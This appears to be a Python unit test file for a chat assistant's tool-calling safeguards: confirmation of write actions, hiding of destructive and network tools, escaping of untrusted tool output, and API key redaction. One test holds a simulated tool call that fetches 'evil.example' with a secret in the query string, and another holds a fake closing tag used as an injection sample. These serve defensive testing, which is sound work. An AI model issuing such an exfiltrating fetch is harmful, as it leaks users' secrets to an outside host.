"""tests/test_chat_tools.py — unit tests for chat tier tool calling.

Tests:
1. schemas: DESTRUCTIVE and desktop.* excluded; names valid and reversible; READ/WRITE tools present.
2. READ tool call round-trip: tool runs, message wrapped as untrusted, model content delivered.
3. WRITE tool call: not executed, pending confirmation created, confirm buttons sent.
4. step budget: loop stops after max steps, final call made without tools.
5. complete_chat against a fake HTTP server: sends tools/tool_choice, parses tool_calls, HTTP error -> ChatError without API key.
6. flag off: ask_chat does not call complete_chat.
"""
from __future__ import annotations

import asyncio
import http.server
import json
import re
import tempfile
import threading
import unittest
from dataclasses import dataclass, field
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

from channel.types import InboundMessage, OutboundPort
from config import Settings
from handlers import chat
from handlers.chat_tools import (
    ToolLoopResult,
    build_tool_schemas,
    func_to_tool_name,
    run_tool_loop,
    tool_to_func_name,
)
from handlers.tools.confirm import get_pending_for_context
from handlers.tools.registry import DangerLevel, TOOL_REGISTRY
from personal_tools.registry import PERSONAL_TOOL_REGISTRY, register_personal_tools
from runner.chat_client import ChatConfig, ChatError, complete_chat


@dataclass
class FakeOutboundPort:
    replies: list[tuple[InboundMessage, str]] = field(default_factory=list)
    sent_new: list[tuple[InboundMessage, str]] = field(default_factory=list)
    edits: list[tuple[InboundMessage, str, str]] = field(default_factory=list)
    buttons: list[tuple[InboundMessage, str, list[list[dict]]]] = field(default_factory=list)
    supports_inline_buttons: bool = True
    supports_attachments: bool = False

    async def reply(self, msg: InboundMessage, text: str) -> str:
        self.replies.append((msg, text))
        return f"ph-{len(self.replies)}"

    async def send_new(self, msg: InboundMessage, text: str) -> str:
        self.sent_new.append((msg, text))
        return f"new-{len(self.sent_new)}"

    async def edit_progress(self, msg: InboundMessage, placeholder_id: str, text: str) -> bool:
        self.edits.append((msg, placeholder_id, text))
        return True

    async def reply_with_buttons(
        self, msg: InboundMessage, text: str, buttons: list[list[dict]]
    ) -> str:
        self.buttons.append((msg, text, buttons))
        return f"btn-{len(self.buttons)}"


def _make_msg(text: str = "hello") -> InboundMessage:
    return InboundMessage(
        channel="telegram",
        operator_id="12345",
        chat_id="chat-1",
        message_id="msg-1",
        text=text,
    )


def _make_settings(tmp_path: Path, **overrides) -> Settings:
    mem = tmp_path / "memory"
    mem.mkdir(parents=True, exist_ok=True)
    defaults = {
        "telegram_bot_token": "fake-token",
        "telegram_allowed_user_id": 12345,
        "codex_workspace_root": tmp_path / "ws",
        "codex_bin": "codex",
        "codex_task_root": tmp_path / "tasks",
        "codex_model": None,
        "codex_timeout_seconds": 60,
        "telegram_progress_seconds": 3,
        "codex_retry_429_delays_seconds": (),
        "codex_memory_root": mem,
        "user_timezone": "UTC",
        "chat_mode": "auto",
        "chat_base_url": "http://127.0.0.1:9999/v1",
        "chat_api_key": "fake-secret-key-12345",
        "chat_model": "test-chat-model",
        "chat_tools_enabled": True,
        "chat_tool_max_steps": 3,
    }
    defaults.update(overrides)
    return Settings(**defaults)


class TestChatToolsSchemas(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.settings = _make_settings(Path(self.tmp.name))

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_schemas_filtering_and_validity(self) -> None:
        register_personal_tools()
        schemas = build_tool_schemas(self.settings)
        self.assertGreater(len(schemas), 10)

        func_names = [s["function"]["name"] for s in schemas]

        # 1. Desktop tools excluded
        for fn in func_names:
            self.assertFalse(fn.startswith("desktop__"), f"desktop tool {fn} exposed")
            self.assertFalse(fn.startswith("desktop."), f"desktop tool {fn} exposed")

        # 2. DESTRUCTIVE tools excluded
        destructive_names = set()
        for name, spec in PERSONAL_TOOL_REGISTRY.items():
            if spec.danger == DangerLevel.DESTRUCTIVE:
                destructive_names.add(name)
        for name, spec in TOOL_REGISTRY.items():
            if spec.danger == DangerLevel.DESTRUCTIVE:
                destructive_names.add(name)

        self.assertIn("notes.delete", destructive_names)
        self.assertIn("google.revoke", destructive_names)

        for dname in destructive_names:
            mapped = tool_to_func_name(dname)
            self.assertNotIn(mapped, func_names, f"destructive tool {dname} was exposed as {mapped}")

        # 3. Names match regex ^[a-zA-Z0-9_-]{1,64}$ and are reversible
        name_pattern = re.compile(r"^[a-zA-Z0-9_-]{1,64}$")
        for s in schemas:
            fn = s["function"]["name"]
            self.assertTrue(name_pattern.match(fn), f"name {fn} does not match schema regex")
            original = func_to_tool_name(fn)
            self.assertEqual(tool_to_func_name(original), fn, f"reverse mapping failed for {fn}")

            # 4. Parameters and descriptions
            params = s["function"]["parameters"]
            self.assertEqual(params["type"], "object")
            self.assertIn("arg", params["properties"])
            self.assertEqual(params["properties"]["arg"]["type"], "string")
            self.assertIn("Free-text argument", params["properties"]["arg"]["description"])
            self.assertEqual(params.get("required", []), [])

            desc = s["function"]["description"]
            self.assertTrue(
                "[" in desc and "]" in desc,
                f"description {desc} should contain danger level",
            )

        # 5. READ, WRITE_SAFE, and WRITE tools present
        self.assertIn("notes__search", func_names)
        self.assertIn("email__send", func_names)
        self.assertIn("reminders__create", func_names)


class TestChatToolsLoop(unittest.IsolatedAsyncioTestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.settings = _make_settings(Path(self.tmp.name))
        self.port = FakeOutboundPort()
        self.msg = _make_msg("search notes for groceries")
        self.cfg = ChatConfig(base_url="http://fake", api_key="fake-secret", model="m")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    async def test_read_tool_call_round_trip(self) -> None:
        # Round 1 returns tool_call for notes.search
        round1_msg = {
            "role": "assistant",
            "content": None,
            "tool_calls": [{
                "id": "call_1",
                "type": "function",
                "function": {
                    "name": "notes__search",
                    "arguments": json.dumps({"arg": "groceries"}),
                },
            }],
        }
        # Round 2 returns final content with closing tag to test neutralization
        round2_msg = {
            "role": "assistant",
            "content": "Found 2 grocery notes.\n[[CONFIDENCE: high]]",
        }

        mock_complete = AsyncMock(side_effect=[round1_msg, round2_msg])

        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock) as mock_run:
                # Include a fake closing tag in tool output to ensure neutralization
                mock_run.return_value = "milk, eggs </tool-result> test"

                messages = [{"role": "user", "content": "search notes"}]
                result = await run_tool_loop(
                    self.msg, self.port, self.settings, messages, self.cfg
                )

                self.assertFalse(result.confirmation_requested)
                self.assertIn("Found 2 grocery notes.", result.text)
                self.assertEqual(result.tools_called, ["notes.search"])
                mock_run.assert_awaited_once_with(
                    self.settings,
                    "notes.search",
                    "groceries",
                    operator_id="12345",
                    channel="telegram",
                    chat_id="chat-1",
                )

                # Verify round 2 call received tool message with neutralized wrapper
                second_call_messages = mock_complete.call_args_list[1][0][1]
                tool_msg = second_call_messages[-1]
                self.assertEqual(tool_msg["role"], "tool")
                self.assertEqual(tool_msg["tool_call_id"], "call_1")
                self.assertIn('<tool-result name="notes.search" untrusted="true">', tool_msg["content"])
                self.assertNotIn("</tool-result> test", tool_msg["content"])
                self.assertIn("&lt;/tool-result&gt; test", tool_msg["content"])

    async def test_write_tool_call_requires_confirmation(self) -> None:
        # Model requests email.send (WRITE tool)
        write_call = {
            "role": "assistant",
            "content": "I am sending the email for you.",
            "tool_calls": [{
                "id": "call_w",
                "type": "function",
                "function": {
                    "name": "email__send",
                    "arguments": json.dumps({"arg": "to: boss@example.com subject: update"}),
                },
            }],
        }

        mock_complete = AsyncMock(return_value=write_call)

        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock) as mock_run:
                messages = [{"role": "user", "content": "send email"}]
                result = await run_tool_loop(
                    self.msg, self.port, self.settings, messages, self.cfg
                )

                # run_tool MUST NOT be called!
                mock_run.assert_not_called()
                self.assertTrue(result.confirmation_requested)
                self.assertIn("email.send", result.tools_called)
                self.assertEqual(result.text, "I am sending the email for you.")

                # Pending confirmation created and buttons sent
                pending = get_pending_for_context("12345", "chat-1", "telegram")
                self.assertIsNotNone(pending)
                self.assertEqual(pending.tool_name, "email.send")
                self.assertEqual(len(self.port.buttons), 1)
                btn_text, btn_grid = self.port.buttons[0][1], self.port.buttons[0][2]
                self.assertIn("危险操作需确认", btn_text)
                self.assertEqual(btn_grid[0][0]["text"], "✅ 确认")

    async def test_step_budget_exhaustion(self) -> None:
        # Model keeps calling tools
        repeated_tool = {
            "role": "assistant",
            "content": None,
            "tool_calls": [{
                "id": "c1",
                "type": "function",
                "function": {"name": "notes__search", "arguments": "{}"},
            }],
        }
        final_answer = {
            "role": "assistant",
            "content": "Final answer after exhausting steps.\n[[CONFIDENCE: low]]",
        }

        # Step limit is 2; 2 tool steps then 1 final no-tools step = 3 complete_chat calls total
        settings_limit2 = _make_settings(Path(self.tmp.name), chat_tool_max_steps=2)
        mock_complete = AsyncMock(side_effect=[repeated_tool, repeated_tool, final_answer])

        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock, return_value="empty"):
                messages = [{"role": "user", "content": "keep searching"}]
                result = await run_tool_loop(
                    self.msg, self.port, settings_limit2, messages, self.cfg
                )

                self.assertFalse(result.confirmation_requested)
                self.assertIn("Final answer after exhausting steps", result.text)
                self.assertEqual(len(result.tools_called), 2)
                self.assertEqual(mock_complete.call_count, 3)
                # The 3rd call must be made without tools (tools=None)
                self.assertIsNone(mock_complete.call_args_list[2][1]["tools"])

    async def test_invalid_json_args_and_unknown_tool(self) -> None:
        round1_msg = {
            "role": "assistant",
            "content": None,
            "tool_calls": [
                {
                    "id": "c_unk",
                    "type": "function",
                    "function": {
                        "name": "nonexistent__tool",
                        "arguments": "invalid json",
                    },
                },
                {
                    "id": "c_known",
                    "type": "function",
                    "function": {
                        "name": "notes__search",
                        "arguments": "{bad json",
                    },
                },
            ],
        }
        round2_msg = {
            "role": "assistant",
            "content": "Answer after unknown and bad json.\n[[CONFIDENCE: high]]",
        }
        mock_complete = AsyncMock(side_effect=[round1_msg, round2_msg])
        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock, return_value="result") as mock_run:
                messages = [{"role": "user", "content": "test"}]
                result = await run_tool_loop(
                    self.msg, self.port, self.settings, messages, self.cfg
                )
                self.assertFalse(result.confirmation_requested)
                self.assertIn("Answer after unknown", result.text)
                # Invalid json treated as ""
                mock_run.assert_awaited_once_with(
                    self.settings,
                    "notes.search",
                    "",
                    operator_id="12345",
                    channel="telegram",
                    chat_id="chat-1",
                )
                # Second call should have tool message with "unknown tool" for c_unk
                second_call_messages = mock_complete.call_args_list[1][0][1]
                unk_tool_msg = [m for m in second_call_messages if m.get("tool_call_id") == "c_unk"][0]
                self.assertEqual(unk_tool_msg["content"], "unknown tool")

    async def test_write_safe_tool_call_requires_confirmation(self) -> None:
        # Model requests notes.add (WRITE_SAFE tool)
        write_safe_call = {
            "role": "assistant",
            "content": "I will record that note for you.",
            "tool_calls": [{
                "id": "call_ws",
                "type": "function",
                "function": {
                    "name": "notes__add",
                    "arguments": json.dumps({"arg": "buy milk"}),
                },
            }],
        }
        mock_complete = AsyncMock(return_value=write_safe_call)
        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock) as mock_run:
                messages = [{"role": "user", "content": "note buy milk"}]
                result = await run_tool_loop(
                    self.msg, self.port, self.settings, messages, self.cfg
                )
                mock_run.assert_not_called()
                self.assertTrue(result.confirmation_requested)
                self.assertIn("notes.add", result.tools_called)
                pending = get_pending_for_context("12345", "chat-1", "telegram")
                self.assertIsNotNone(pending)
                self.assertEqual(pending.tool_name, "notes.add")

    async def test_destructive_tool_call_treated_as_unknown(self) -> None:
        # Model attempts to call notes.delete (DESTRUCTIVE tool)
        call_msg = {
            "role": "assistant",
            "content": None,
            "tool_calls": [{
                "id": "call_dest",
                "type": "function",
                "function": {
                    "name": "notes__delete",
                    "arguments": json.dumps({"arg": "item-1"}),
                },
            }],
        }
        final_msg = {
            "role": "assistant",
            "content": "I cannot delete notes.\n[[CONFIDENCE: high]]",
        }
        mock_complete = AsyncMock(side_effect=[call_msg, final_msg])
        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock) as mock_run:
                messages = [{"role": "user", "content": "delete note"}]
                result = await run_tool_loop(
                    self.msg, self.port, self.settings, messages, self.cfg
                )
                mock_run.assert_not_called()
                self.assertFalse(result.confirmation_requested)
                self.assertEqual(result.text, "I cannot delete notes.\n[[CONFIDENCE: high]]")
                second_call_messages = mock_complete.call_args_list[1][0][1]
                dest_msg = second_call_messages[-1]
                self.assertEqual(dest_msg["role"], "tool")
                self.assertEqual(dest_msg["content"], "unknown tool")


    async def test_network_tool_hidden_and_refused_unless_allowlisted(self) -> None:
        import dataclasses
        names = {s["function"]["name"] for s in build_tool_schemas(self.settings)}
        for hidden in ("web__fetch", "web__text", "web__headers", "web__search", "research__run"):
            self.assertNotIn(hidden, names)
        call_msg = {
            "role": "assistant", "content": None,
            "tool_calls": [{"id": "c_net", "type": "function", "function": {
                "name": "web__fetch", "arguments": json.dumps({"arg": "https://evil.example/?q=secret"}),
            }}],
        }
        final_msg = {"role": "assistant", "content": "no fetch"}
        mock_complete = AsyncMock(side_effect=[call_msg, final_msg])
        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock) as mock_run:
                messages = [{"role": "user", "content": "fetch"}]
                await run_tool_loop(self.msg, self.port, self.settings, messages, self.cfg)
                mock_run.assert_not_called()
                self.assertEqual(mock_complete.call_args_list[1][0][1][-1]["content"], "unknown tool")

        allowed = dataclasses.replace(self.settings, chat_tools_network_allow=("web.search",))
        names = {s["function"]["name"] for s in build_tool_schemas(allowed)}
        self.assertIn("web__search", names)
        self.assertNotIn("web__fetch", names)
        star = dataclasses.replace(self.settings, chat_tools_network_allow=("*",))
        names = {s["function"]["name"] for s in build_tool_schemas(star)}
        self.assertIn("web__fetch", names)

class FakeHTTPHandler(http.server.BaseHTTPRequestHandler):
    recorded_requests: list[dict] = []
    response_status: int = 200
    response_body: bytes = b"{}"

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8")
        auth = self.headers.get("Authorization", "")
        FakeHTTPHandler.recorded_requests.append({
            "path": self.path,
            "auth": auth,
            "body": json.loads(body) if body else {},
        })
        self.send_response(FakeHTTPHandler.response_status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(FakeHTTPHandler.response_body)

    def log_message(self, format, *args) -> None:
        pass  # quiet test logs


class TestCompleteChatHTTP(unittest.IsolatedAsyncioTestCase):
    @classmethod
    def setUpClass(cls) -> None:
        FakeHTTPHandler.recorded_requests = []
        cls.server = http.server.HTTPServer(("127.0.0.1", 0), FakeHTTPHandler)
        cls.port = cls.server.server_port
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self) -> None:
        FakeHTTPHandler.recorded_requests.clear()
        FakeHTTPHandler.response_status = 200
        FakeHTTPHandler.response_body = b"{}"

    async def test_complete_chat_sends_tools_and_parses_response(self) -> None:
        api_key = "secret-token-xyz-987"
        config = ChatConfig(
            base_url=f"http://127.0.0.1:{self.port}",
            api_key=api_key,
            model="test-model",
            timeout=5,
        )
        fake_response = {
            "choices": [{
                "index": 0,
                "message": {
                    "role": "assistant",
                    "content": "Checking notes...",
                    "tool_calls": [{
                        "id": "call_123",
                        "type": "function",
                        "function": {
                            "name": "notes__search",
                            "arguments": "{\"arg\": \"test\"}",
                        },
                    }],
                },
            }]
        }
        FakeHTTPHandler.response_status = 200
        FakeHTTPHandler.response_body = json.dumps(fake_response).encode("utf-8")

        tools = [{
            "type": "function",
            "function": {"name": "notes__search", "description": "search"},
        }]
        messages = [{"role": "user", "content": "hello"}]

        resp = await complete_chat(config, messages, tools=tools)

        self.assertEqual(resp.get("content"), "Checking notes...")
        self.assertIn("tool_calls", resp)
        self.assertEqual(resp["tool_calls"][0]["id"], "call_123")

        # Verify outgoing HTTP payload
        self.assertEqual(len(FakeHTTPHandler.recorded_requests), 1)
        req = FakeHTTPHandler.recorded_requests[0]
        self.assertEqual(req["auth"], f"Bearer {api_key}")
        self.assertEqual(req["body"]["tool_choice"], "auto")
        self.assertEqual(req["body"]["tools"], tools)

    async def test_complete_chat_http_error_redacts_api_key(self) -> None:
        api_key = "secret-token-xyz-987"
        config = ChatConfig(
            base_url=f"http://127.0.0.1:{self.port}",
            api_key=api_key,
            model="test-model",
            timeout=5,
        )
        FakeHTTPHandler.response_status = 500
        FakeHTTPHandler.response_body = b'{"error": "Internal Error"}'

        with self.assertRaises(ChatError) as cm:
            await complete_chat(config, [{"role": "user", "content": "hi"}])

        err_msg = str(cm.exception)
        self.assertIn("500", err_msg)
        self.assertNotIn(api_key, err_msg)


class TestAskChatToolWiring(unittest.IsolatedAsyncioTestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.port = FakeOutboundPort()
        self.msg = _make_msg("what is in my notes?")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    async def test_flag_off_does_not_call_complete_chat(self) -> None:
        settings_off = _make_settings(Path(self.tmp.name), chat_tools_enabled=False)

        mock_complete = AsyncMock()
        async def fake_stream(cfg, msgs):
            yield "Here is your notes answer.\n[[CONFIDENCE: high]]"

        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("runner.chat_client.stream_chat", side_effect=fake_stream):
                outcome, checked = await chat.ask_chat(
                    self.msg, self.port, settings_off, question="what is in my notes?"
                )

                self.assertEqual(outcome, "answered")
                mock_complete.assert_not_called()
                # Placeholder was edited with final streamed answer
                self.assertGreater(len(self.port.edits), 0)
                self.assertIn("Here is your notes answer.", self.port.edits[-1][2])

    async def test_flag_on_wires_tool_loop_and_handles_confirmation(self) -> None:
        settings_on = _make_settings(Path(self.tmp.name), chat_tools_enabled=True)

        loop_res = ToolLoopResult(
            text="I will now send an email for you.",
            tools_called=["email.send"],
            confirmation_requested=True,
        )
        with patch("handlers.chat_tools.run_tool_loop", AsyncMock(return_value=loop_res)):
            outcome, checked = await chat.ask_chat(
                self.msg, self.port, settings_on, question="send an email"
            )

            self.assertEqual(outcome, "answered")
            self.assertIsNone(checked)
            # Placeholder edited with model text
            self.assertGreater(len(self.port.edits), 0)
            self.assertEqual(self.port.edits[-1][2], "I will now send an email for you.")

    async def test_flag_on_read_tool_end_to_end(self) -> None:
        settings_on = _make_settings(Path(self.tmp.name), chat_tools_enabled=True)
        round1 = {
            "role": "assistant",
            "content": None,
            "tool_calls": [{
                "id": "tc1",
                "type": "function",
                "function": {"name": "notes__search", "arguments": json.dumps({"arg": "test"})},
            }],
        }
        round2 = {
            "role": "assistant",
            "content": "You have a note about test.\n[[CONFIDENCE: high]]",
        }
        mock_complete = AsyncMock(side_effect=[round1, round2])
        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock, return_value="test note contents"):
                outcome, checked = await chat.ask_chat(
                    self.msg, self.port, settings_on, question="search note test"
                )
                self.assertEqual(outcome, "answered")
                self.assertIsNotNone(checked)
                self.assertEqual(checked.confidence, "high")
                self.assertIn("You have a note about test.", checked.body)
                # Placeholder edited with final answer
                self.assertGreater(len(self.port.edits), 0)
                self.assertIn("You have a note about test.", self.port.edits[-1][2])

    async def test_flag_on_read_tool_result_counts_as_evidence(self) -> None:
        # Time-sensitive question answered from a READ tool must not get the
        # "unverified" footer (found in the live DeepSeek test).
        settings_on = _make_settings(Path(self.tmp.name), chat_tools_enabled=True)
        self.assertTrue(chat.is_time_sensitive("我最近的笔记有哪些"))
        round1 = {
            "role": "assistant", "content": None,
            "tool_calls": [{"id": "tc_ts", "type": "function",
                            "function": {"name": "notes__list_recent", "arguments": "{}"}}],
        }
        round2 = {"role": "assistant", "content": "最近 1 条笔记：买牛奶\n[[CONFIDENCE: high]]"}
        with patch("handlers.chat_tools.complete_chat", AsyncMock(side_effect=[round1, round2])):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock, return_value="#1 买牛奶"):
                outcome, _ = await chat.ask_chat(
                    self.msg, self.port, settings_on, question="我最近的笔记有哪些"
                )
        self.assertEqual(outcome, "answered")
        self.assertIn("买牛奶", self.port.edits[-1][2])
        self.assertNotIn("未联网核实", self.port.edits[-1][2])

    async def test_flag_on_tool_urls_are_allowed_in_final_answer(self) -> None:
        settings_on = _make_settings(Path(self.tmp.name), chat_tools_enabled=True)
        url = "https://example.com/item/42"
        round1 = {
            "role": "assistant",
            "content": None,
            "tool_calls": [{
                "id": "tc_url",
                "type": "function",
                "function": {"name": "notes__search", "arguments": json.dumps({"arg": "item"})},
            }],
        }
        round2 = {
            "role": "assistant",
            "content": f"See {url} for details.\n[[CONFIDENCE: high]]",
        }
        mock_complete = AsyncMock(side_effect=[round1, round2])
        with patch("handlers.chat_tools.complete_chat", mock_complete):
            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock, return_value=f"Document at {url}"):
                outcome, checked = await chat.ask_chat(
                    self.msg, self.port, settings_on, question="find item doc"
                )
                self.assertEqual(outcome, "answered")
                self.assertIsNotNone(checked)
                self.assertEqual(checked.removed_links, 0)
                self.assertIn(url, checked.body)
                self.assertNotIn("(链接已移除)", checked.body)


if __name__ == "__main__":
    unittest.main()


